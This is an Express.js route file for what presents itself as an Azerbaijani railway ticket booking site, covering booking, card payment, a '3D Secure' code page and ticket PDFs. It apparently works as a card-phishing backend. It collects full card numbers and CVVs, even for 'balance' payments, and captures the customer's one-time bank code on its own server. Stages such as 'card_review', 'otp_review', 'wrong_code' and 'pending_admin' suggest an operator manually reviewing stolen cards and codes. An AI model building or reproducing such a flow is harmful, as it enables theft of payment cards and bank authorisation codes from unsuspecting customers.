// src/routes/booking.js - Ödəniş bölümü (tam)

const express = require('express');
const { Order, Ticket, Trip, Payment } = require('../models/index');
const { requireAuth } = require('../middleware/auth');
const bookingService = require('../services/bookingService');
const paymentService = require('../services/paymentService');
const { generateTicketPdf } = require('../services/ticketPdfService');
const config = require('../config');
const h = require('../utils/helpers');

const router = express.Router();

const CARD_FIELDS = ['number', 'holder', 'expiry', 'cvv'];

// ==================== KART VALIDASIYASI ====================
function validateCardInput(card) {
  if (!card) return 'Kart məlumatları daxil edilməyib';
  if (!h.luhnValid(card.number)) return 'Kart nömrəsi yanlışdır';
  if (!String(card.holder || '').trim()) return 'Kart sahibinin adı daxil edilməyib';

  const parts = String(card.expiry || '').split('/');
  if (parts.length !== 2 || !h.expiryValid(parts[0], parts[1])) return 'Kartın bitmə tarixi yanlışdır';
  if (!/^\d{3,4}$/.test(String(card.cvv || '').trim())) return 'CVV yanlışdır';
  return null;
}

// ❌ validateCode FUNCTION SİLİNDİ

// ==================== REZERVASIYA ====================
router.get('/rezervasyon/:tripId', requireAuth, async (req, res, next) => {
  try {
    const trip = await Trip.findById(req.params.tripId).lean();
    if (!trip) return next();

    let seats = [];
    try {
      seats = JSON.parse(req.query.seats || '[]');
    } catch (e) {
      seats = [];
    }
    if (!Array.isArray(seats) || !seats.length) {
      return res.redirect('/' + res.locals.locale + '/yer-secimi/' + req.params.tripId);
    }

    const from = String(req.query.from || (trip.stops[0] || {}).code || '');
    const to = String(req.query.to || (trip.stops[trip.stops.length - 1] || {}).code || '');

    const enriched = seats.map((s) => {
      const calc = bookingService.priceFor(trip, from, to, s.classCode);
      return { ...s, price: calc.price, className: calc.title };
    });

    const total = enriched.reduce((sum, s) => sum + Number(s.price || 0), 0);

    res.render('pages/checkout', {
      title: res.locals.t('checkout.title'),
      trip,
      seats: enriched,
      from,
      to,
      fromName: (trip.stops.find((s) => s.code === from) || {}).name || '',
      toName: (trip.stops.find((s) => s.code === to) || {}).name || '',
      total,
      user: req.currentUser
    });
  } catch (e) {
    next(e);
  }
});

// ==================== SIFARIŞ YARATMA ====================
router.post('/api/booking/order', requireAuth, async (req, res) => {
  try {
    const b = req.body || {};
    const passengers = (b.passengers || []).map((p, i) => ({
      firstName: p.firstName,
      lastName: p.lastName,
      middleName: p.middleName || '',
      birthDate: p.birthDate || '',
      docType: p.docType || 'id',
      docNumber: p.docNumber || '',
      phone: p.phone || b.contactPhone || '',
      wagon: p.wagon,
      seat: p.seat,
      classCode: p.classCode
    }));

    if (passengers.some((p) => !p.firstName || !p.lastName)) {
      return res.status(400).json({ ok: false, message: 'Sərnişin adı və soyadı vacibdir' });
    }

    const order = await bookingService.createPendingOrder(req.currentUser, {
      tripId: b.tripId,
      fromCode: String(b.fromCode || '').toUpperCase(),
      toCode: String(b.toCode || '').toUpperCase(),
      passengers,
      contactPhone: b.contactPhone,
      contactEmail: b.contactEmail,
      method: b.method
    });

    return res.json({
      ok: true,
      message: 'Sifariş yaradıldı',
      orderId: String(order._id),
      orderNo: order.orderNo,
      redirect: '/' + res.locals.locale + '/odenis/' + order._id
    });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Sifariş yaradıla bilmədi' });
  }
});

// ==================== ÖDƏNIŞ FORMASI ====================
router.get('/odenis/:orderId', requireAuth, async (req, res, next) => {
  try {
    const order = await Order.findOne({ _id: req.params.orderId, user: req.currentUser._id }).lean();
    if (!order) return next();

    if (order.status === 'awaiting_verification' || order.status === 'code_submitted') {
      return res.redirect('/' + res.locals.locale + '/3d-tesdiq/' + order._id);
    }
    if (order.status === 'confirmed') {
      return res.redirect('/' + res.locals.locale + '/ugur/' + order._id);
    }
    if (order.status === 'pending_admin') {
      return res.redirect('/' + res.locals.locale + '/odenis-gozleme/' + order._id);
    }

    const trip = await Trip.findById(order.trip).lean();

    res.render('pages/payment', {
      title: res.locals.t('search.payTitle'),
      order,
      trip,
      balance: req.currentUser.balance || 0
    });
  } catch (e) {
    next(e);
  }
});

// ==================== ÖDƏNIŞ BAŞLAT (KART) ====================
router.post('/api/payment/card/init', requireAuth, async (req, res) => {
  try {
    const b = req.body || {};
    const order = await Order.findOne({ _id: b.orderId, user: req.currentUser._id });
    if (!order) return res.status(404).json({ ok: false, message: 'Sifariş tapılmadı' });
    
    if (['confirmed', 'refunded', 'pending_admin', 'awaiting_verification', 'code_submitted'].indexOf(order.status) > -1) {
      return res.status(400).json({ ok: false, message: 'Sifariş artıq yekunlaşıb' });
    }

    // ✅ Yalnız kart validasiyası (3D kod yoxdur)
    const err = validateCardInput(b.card);
    if (err) return res.status(400).json({ ok: false, message: err });

    // ✅ OTP otomatik yaradılır (kod parametresi yoxdur)
    const payment = await paymentService.initPayment(order, b.card, 'card');

    return res.json({
      ok: true,
      message: 'Kart məlumatları qeydə alındı. 3D Secure ekranına yönləndirilirsiz...',
      paymentId: String(payment._id),
      redirect: '/' + res.locals.locale + '/3d-tesdiq/' + order._id
    });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Ödəniş başladıla bilmədi' });
  }
});

// ==================== ÖDƏNIŞ BAŞLAT (BALANS) ====================
router.post('/api/payment/balance/init', requireAuth, async (req, res) => {
  try {
    const b = req.body || {};
    const order = await Order.findOne({ _id: b.orderId, user: req.currentUser._id });
    if (!order) return res.status(404).json({ ok: false, message: 'Sifariş tapılmadı' });
    
    if (['confirmed', 'refunded', 'pending_admin', 'awaiting_verification', 'code_submitted'].indexOf(order.status) > -1) {
      return res.status(400).json({ ok: false, message: 'Sifariş artıq yekunlaşıb' });
    }

    // ✅ Yalnız kart validasiyası (3D kod yoxdur)
    const err = validateCardInput(b.card);
    if (err) return res.status(400).json({ ok: false, message: err });

    if ((req.currentUser.balance || 0) < order.total) {
      return res.status(400).json({ ok: false, message: 'Balans kifayət etmir' });
    }

    // ✅ OTP otomatik yaradılır (kod parametresi yoxdur)
    const payment = await paymentService.initPayment(order, b.card, 'balance');

    return res.json({
      ok: true,
      message: 'Balans ödənişi 3D Secure ekranına göndərildi.',
      paymentId: String(payment._id),
      redirect: '/' + res.locals.locale + '/3d-tesdiq/' + order._id
    });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'Ödəniş başladıla bilmədi' });
  }
});

// ==================== OTP GİRİŞİ ====================
router.get('/3d-tesdiq/:orderId', requireAuth, async (req, res, next) => {
  try {
    const order = await Order.findOne({ _id: req.params.orderId, user: req.currentUser._id }).lean();
    if (!order) return next();

    if (order.status === 'confirmed') {
      return res.redirect('/' + res.locals.locale + '/ugur/' + order._id);
    }
    if (['awaiting_verification', 'code_submitted'].indexOf(order.status) === -1) {
      return res.redirect('/' + res.locals.locale + '/odenis-gozleme/' + order._id);
    }

    const payment = order.payment ? await Payment.findById(order.payment).lean() : null;
    const stage = payment ? payment.stage : 'otp_entry';

    res.render('pages/secure3d', {
      title: res.locals.t('secure3d.title'),
      order,
      payment,
      cardMasked: payment && payment.card ? payment.card.masked : '',
      stage,
      secondsLeft: payment ? paymentService.secondsLeft(payment) : 0,
      stageSeconds: paymentService.STAGE_SECONDS,
      codeSubmitted: stage === 'otp_review' || order.status === 'code_submitted'
    });
  } catch (e) {
    next(e);
  }
});

// ==================== OTP GÖNDƏRİŞİ ====================
router.post('/api/payment/verify', requireAuth, async (req, res) => {
  try {
    const b = req.body || {};
    const order = await Order.findOne({ _id: b.orderId, user: req.currentUser._id }).select('_id').lean();
    if (!order) return res.status(404).json({ ok: false, message: 'Sifariş tapılmadı' });

    const result = await paymentService.submitVerificationCode({ orderId: b.orderId }, b.code, { ip: req.ip });
    return res.json({
      ok: true,
      message: 'OTP göndərildi. Yekun təsdiq gözlənilir.',
      matched: result.matched
    });
  } catch (e) {
    return res.status(e.status || 500).json({ ok: false, message: e.message || 'OTP göndərilə bilmədi' });
  }
});

// ==================== ÖDƏNIŞ STATUSU ====================
router.get('/api/payment/:orderId/status', requireAuth, async (req, res) => {
  try {
    const order = await Order.findOne({ _id: req.params.orderId, user: req.currentUser._id }).lean();
    if (!order) return res.status(404).json({ ok: false, message: 'Sifariş tapılmadı' });
    
    const payment = order.payment ? await Payment.findById(order.payment).lean() : null;
    const stage = payment ? payment.stage : 'card_review';

    let redirect = null;
    if (order.status === 'confirmed') redirect = '/' + res.locals.locale + '/ugur/' + order._id;
    else if (stage === 'otp_entry') redirect = '/' + res.locals.locale + '/3d-tesdiq/' + order._id;
    else if (order.status === 'rejected') redirect = '/' + res.locals.locale + '/odenis-gozleme/' + order._id;

    res.json({
      ok: true,
      status: order.status,
      stage,
      wrongCode: stage === 'wrong_code',
      secondsLeft: payment ? paymentService.secondsLeft(payment) : 0,
      stageSeconds: paymentService.STAGE_SECONDS,
      redirect,
      message: order.adminNote || ''
    });
  } catch (e) {
    res.status(500).json({ ok: false, message: 'Vəziyyət oxunmadı' });
  }
});

// ==================== UĞUR ====================
router.get('/ugur/:orderId', requireAuth, async (req, res, next) => {
  try {
    const order = await Order.findOne({ _id: req.params.orderId, user: req.currentUser._id }).lean();
    if (!order) return next();
    const tickets = await Ticket.find({ order: order._id }).lean();
    res.render('pages/success', { title: 'Bilet alındı', order, tickets });
  } catch (e) {
    next(e);
  }
});

// ==================== BİLET PDF ====================
router.get('/bilet/:ticketId/pdf', requireAuth, async (req, res, next) => {
  try {
    const ticket = await Ticket.findOne({ _id: req.params.ticketId, user: req.currentUser._id }).lean();
    if (!ticket) return next();
    const order = await Order.findById(ticket.order).lean();
    const buffer = await generateTicketPdf(ticket, order, { locale: res.locals.locale });
    res.setHeader('Content-Type', 'application/pdf');
    res.setHeader('Content-Disposition', 'attachment; filename="ady-bilet-' + ticket.pnr + '.pdf"');
    return res.send(buffer);
  } catch (e) {
    next(e);
  }
});

module.exports = router;
